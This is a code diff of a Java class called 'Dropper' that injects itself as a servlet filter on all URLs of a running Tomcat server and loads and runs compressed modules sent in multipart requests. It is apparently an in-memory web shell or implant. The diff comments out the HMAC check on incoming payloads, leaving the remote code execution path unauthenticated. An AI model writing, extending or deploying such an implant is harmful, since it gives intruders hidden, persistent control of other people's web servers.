@@ -10,9 +10,9 @@ package party.itistimeto.broodwich;
 // preferred third option probably wildfly (or undertow?), four weblogic
 
 public class Dropper implements javax.servlet.Filter {
-    private final java.lang.String macAlgo = "HmacSHA256";
+    /*private final java.lang.String macAlgo = "HmacSHA256";
     private javax.crypto.SecretKey secretKey;
-    public static final java.lang.String digestKey = "broodwichDigest";
+    public static final java.lang.String digestKey = "broodwichDigest";*/
     public static final java.lang.String moduleIdKey = "broodwichModuleId";
     public static final java.lang.String payloadKey = "broodwichCommand";
     public static final java.lang.String moduleParamsKey = "broodwichParams";
@@ -20,7 +20,7 @@ public class Dropper implements javax.servlet.Filter {
     private static final java.lang.String filterName = "broodwich";
     private java.util.concurrent.ConcurrentMap<java.lang.String, java.lang.reflect.Method> modules;
 
-    public static void taste(javax.servlet.http.HttpServlet servlet, byte[] key) {
+    public static void taste(javax.servlet.http.HttpServlet servlet/*, byte[] key*/) {
         javax.servlet.ServletContext contextFacade = servlet.getServletContext();
         if (!contextFacade.getFilterRegistrations().containsKey(filterName)) {
             try {
@@ -46,11 +46,12 @@ public class Dropper implements javax.servlet.Filter {
                 // create filter definition
                 org.apache.tomcat.util.descriptor.web.FilterDef filterDef = new org.apache.tomcat.util.descriptor.web.FilterDef();
                 filterDef.setFilterName(filterName);
-                filterDef.setFilter(new party.itistimeto.broodwich.Dropper(key));
+                filterDef.setFilter(new party.itistimeto.broodwich.Dropper(/*key*/));
 
                 // create filter map
                 org.apache.tomcat.util.descriptor.web.FilterMap filterMap = new org.apache.tomcat.util.descriptor.web.FilterMap();
                 filterMap.setFilterName(filterName);
+                // TODO: paramaterize URL pattern
                 filterMap.addURLPattern("/*");
                 // TODO: or should we use "upper" context?
                 for(String servletName : standardContext.getServletContext().getServletRegistrations().keySet()) {
@@ -76,9 +77,9 @@ public class Dropper implements javax.servlet.Filter {
         }
     }
 
-    private Dropper(byte[] secretKey) {
+    private Dropper(/*byte[] secretKey*/) {
         super();
-        this.secretKey = new javax.crypto.spec.SecretKeySpec(secretKey, macAlgo);
+        /*this.secretKey = new javax.crypto.spec.SecretKeySpec(secretKey, macAlgo);*/
     }
 
     @Override
@@ -100,7 +101,7 @@ public class Dropper implements javax.servlet.Filter {
             if(!parts.isEmpty()) {
                 byte[] compressedPayload = null;
                 String moduleId = null;
-                byte[] digest = null;
+                /*byte[] digest = null;*/
                 byte[] moduleParams = null;
                 int payloadLength = 0;
 
@@ -115,10 +116,10 @@ public class Dropper implements javax.servlet.Filter {
                             new java.io.DataInputStream(part.getInputStream()).readFully(moduleIdBytes);
                             moduleId = java.util.Arrays.toString(moduleIdBytes);
                             break;
-                        case digestKey:
+                        /*case digestKey:
                             digest = new byte[(int)part.getSize()];
                             new java.io.DataInputStream(part.getInputStream()).readFully(digest);
-                            break;
+                            break;*/
                         case moduleParamsKey:
                             moduleParams = new byte[(int)part.getSize()];
                             new java.io.DataInputStream(part.getInputStream()).readFully(moduleParams);
@@ -131,14 +132,14 @@ public class Dropper implements javax.servlet.Filter {
                     }
                 }
 
-                if(compressedPayload != null && moduleId != null && digest != null && payloadLength > 0) {
+                if(compressedPayload != null && moduleId != null /*&& digest != null*/ && payloadLength > 0) {
                     try {
-                        javax.crypto.Mac mac = javax.crypto.Mac.getInstance(macAlgo);
+                        /*javax.crypto.Mac mac = javax.crypto.Mac.getInstance(macAlgo);
                         mac.init(secretKey);
                         byte[] computedDigest = mac.doFinal(compressedPayload);
 
                         // todo: timing attacks etc.
-                        if(java.util.Arrays.equals(computedDigest, digest)) {
+                        if(java.util.Arrays.equals(computedDigest, digest)) {*/
                             byte[] payload = new byte[payloadLength];
                             new java.io.DataInputStream(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(compressedPayload))).readFully(payload);
 
@@ -170,8 +171,8 @@ public class Dropper implements javax.servlet.Filter {
                                     runModule.invoke(null, (Object) moduleParams);
                                 }
                             }
-                        }
-                    } catch (java.security.NoSuchAlgorithmException | java.security.InvalidKeyException | IllegalAccessException | java.lang.reflect.InvocationTargetException e) {
+                        /*}*/
+                    } catch (/*java.security.NoSuchAlgorithmException | java.security.InvalidKeyException |*/ IllegalAccessException | java.lang.reflect.InvocationTargetException e) {
                         e.printStackTrace();
                     }
                 }
